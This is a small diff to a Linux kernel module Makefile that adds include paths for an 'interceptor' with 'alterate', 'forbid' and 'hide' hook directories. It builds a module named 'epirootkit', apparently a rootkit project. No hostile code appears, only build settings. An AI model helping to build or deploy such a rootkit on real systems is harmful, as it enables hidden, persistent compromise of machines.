@@ -1,6 +1,13 @@
 KERNELDIR := /lib/modules/$(shell uname -r)/build
 PWD       := $(shell pwd)
 
+ccflags-y := \
+        -I$(src) \
+        -I$(src)/interceptor/core/include \
+        -I$(src)/interceptor/hooks/alterate \
+        -I$(src)/interceptor/hooks/forbid \
+        -I$(src)/interceptor/hooks/hide
+
 obj-m := epirootkit.o
 
 epirootkit-objs := \
